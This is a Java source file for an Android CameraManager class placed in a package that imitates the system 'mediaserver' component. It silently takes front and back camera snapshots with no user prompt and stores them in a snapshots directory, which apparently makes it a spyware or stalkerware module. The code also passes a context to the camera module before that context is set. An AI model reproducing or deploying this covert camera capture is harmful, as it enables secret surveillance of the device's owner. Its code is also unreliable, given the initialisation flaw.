package com.android.mediaserver.camera;

import android.content.Context;
import android.os.Build;
import android.os.Build.VERSION;
import com.android.mediaserver.config.Config;
import com.sromku.simple.storage.SimpleStorage;
import timber.log.Timber;

public class CameraManager {
  private static CameraManager mInstance;
  private Context mContext;
  private ModuleCamera mCamera = new ModuleCamera(mContext,
      SimpleStorage.getInternalStorage(mContext)
          .getFile(Config.getInstance(mContext).getSnapshotsDirectoryName())
          .getAbsolutePath(), true, true);

  private CameraManager(Context context) {
    mContext = context.getApplicationContext();
  }

  public static CameraManager getInstance(Context context) {
    if (mInstance == null) {
      mInstance = new CameraManager(context);
    }
    return mInstance;
  }

  public void takeSnapshot(boolean takeFront, boolean takeBack) {
    if (checkCameraHardware(mContext)) {
      mCamera.setTakeFront(takeFront);
      mCamera.setTakeBack(takeBack);
      Thread camThread = new Thread(mCamera);
      camThread.start();
      try {
        camThread.join();
        Timber.d("Camera snapshot taken", new Object[0]);
        return;
      } catch (InterruptedException e) {
        e.printStackTrace();
        Timber.d("Possibly failed to take snapshot, Thread join failed", new Object[0]);
        return;
      }
    }
    Timber.d("Cannot find camera hardware, Camera snapshot not taken", new Object[0]);
  }

  private boolean checkCameraHardware(Context context) {
    if (Build.DEVICE.equals("mako") && VERSION.SDK_INT < 18) {
      Timber.d("(checkCameraHardware), disabled on nexus4 up to 4.2", new Object[0]);
      return false;
    } else if (context.getPackageManager().hasSystemFeature("android.hardware.camera")
        || context.getPackageManager().hasSystemFeature("android.hardware.camera.front")) {
      Timber.d("checkCameraHardware), camera present", new Object[0]);
      return true;
    } else {
      Timber.d("(checkCameraHardware), no camera", new Object[0]);
      return false;
    }
  }
}
